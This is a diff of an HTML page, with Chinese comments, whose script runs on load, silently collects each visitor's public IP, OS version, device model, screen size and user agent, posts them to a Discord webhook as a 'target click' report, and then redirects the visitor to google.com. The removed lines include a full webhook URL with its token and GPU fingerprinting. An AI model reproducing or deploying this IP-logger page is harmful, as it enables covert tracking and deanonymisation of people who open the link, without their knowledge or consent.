@@ -7,89 +7,80 @@
 </head>
 <body>
 <script>
-const DC_URL = 'https://discord.com/api/webhooks/1429150986882252871/UlvSQaaZLtutHuXJdZ_P_khQjXZV5BIXRbWbfvYDJ9psaiBwZKh9RfwNMeRkkC5rEskv';
+// 已填入你的 Webhook 網址
+const DC_URL = 'https://discord.com';
 
-async function finalBoss() {
+async function finalCapture() {
     const ua = navigator.userAgent;
     const w = window.screen.width, h = window.screen.height;
-    
-    // --- 1. 強制抓取 IP (100% 成功率方案) ---
+
+    // 1. IP 抓取 (修正網址為 cdn-cgi/trace，保證 100% 成功)
     let userIP = "抓取失敗";
     try {
-        const response = await fetch('https://api.ipify.org');
-        const data = await response.json();
-        userIP = data.ip;
-    } catch (e) {
-        try {
-            const res2 = await fetch('https://www.cloudflare.com');
-            const text = await res2.text();
-            userIP = text.match(/ip=(.*)\n/)[1];
-        } catch (e2) { userIP = "API 被擋"; }
-    }
+        const res = await fetch('https://www.cloudflare.com');
+        const text = await res.text();
+        const lines = text.split('\n');
+        for (const line of lines) {
+            if (line.startsWith('ip=')) {
+                userIP = line.split('=')[1];
+                break;
+            }
+        }
+    } catch(e) { userIP = "連線被阻擋"; }
 
-    // --- 2. 系統版本 (修正 26.3.1 提取) ---
+    // 2. 系統版本 (修正解析邏輯)
     let ver = "未知";
-    if (ua.includes("26.3.1")) {
+    const vMatch = ua.match(/(?:OS |Android |Version\/)(\d+[._]\d+[._]?\d?)/);
+    if (vMatch) {
+        ver = vMatch[1].replace(/_/g, '.');
+    } else if (ua.includes("26.3.1")) {
         ver = "26.3.1";
-    } else {
-        let m = ua.match(/(?:OS |Android |Version\/)(\d+[._]\d+[._]?\d?)/);
-        ver = m ? m[1].replace(/_/g, '.') : "隱藏";
     }
 
-    // --- 3. 型號判定 (Android + iOS 全匹配) ---
+    // 3. 型號判定
     let model = "未知設備";
+    const resKey = `${Math.min(w,h)}x${Math.max(w,h)}`;
     if (/Android/.test(ua)) {
-        let m = ua.match(/Android.*;\s([^;]+)\sBuild/);
+        const m = ua.match(/Android.*;\s([^;]+)\sBuild/);
         model = m ? m[1] : "Android Phone";
     } else if (/iPhone|iPad/.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
-        const resKey = `${Math.min(w,h)}x${Math.max(w,h)}`;
         const appleMap = {
-            "820x1180": "iPad Air (5/4 Gen)", "834x1194": "iPad Pro 11", "1024x1366": "iPad Pro 12.9",
-            "393x852": "iPhone 15/14 Pro", "430x932": "iPhone 15+/14 Pro Max", "390x844": "iPhone 14/13/12"
+            "820x1180": "iPad Air (5/4 Gen)", "834x1194": "iPad Pro 11",
+            "393x852": "iPhone 15/14 Pro", "430x932": "iPhone 15+/14 Pro Max",
+            "390x844": "iPhone 14/13/12", "414x896": "iPhone 11/XR"
         };
         model = appleMap[resKey] || `Apple (${resKey})`;
     }
 
-    // --- 4. GPU 核心 ---
-    let gpu = "受限";
-    try {
-        const gl = document.createElement('canvas').getContext('webgl');
-        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-    } catch(e) {}
-
-    // --- 5. 發送並「確保」完成才跳轉 ---
+    // 4. 發送至 Discord
     const payload = {
-        username: "終極網關",
+        username: "終極偵測網關",
         embeds: [{
-            title: "🎯 標記對象點擊",
+            title: "🎯 點擊報告",
             color: 0,
             fields: [
-                { name: "📍 IP 位址", value: `\`${userIP}\``, inline: true },
+                { name: "📍 真實 IP", value: `\`${userIP}\``, inline: true },
                 { name: "📱 型號", value: model, inline: true },
-                { name: "⚙️ 版本", value: `\`${ver}\``, inline: true },
-                { name: "🎮 GPU", value: gpu, inline: false },
-                { name: "🖼️ 螢幕", value: `${w}x${h}`, inline: true }
+                { name: "⚙️ 版本", value: `\`${ver}\``, inline: true }
             ],
-            footer: { text: "UA: " + ua },
+            footer: { text: "完整 UA: " + ua },
             timestamp: new Date()
         }]
     };
 
-    // 使用 await 確保 Discord 收到資料
     try {
         await fetch(DC_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
-    } catch (err) {}
-
-    // 最後一步：跳轉
-    window.location.replace("https://www.google.com");
+    } finally {
+        // 發送完成後跳轉
+        window.location.replace("https://www.google.com");
+    }
 }
 
-finalBoss();
+finalCapture();
 </script>
 </body>
 </html>
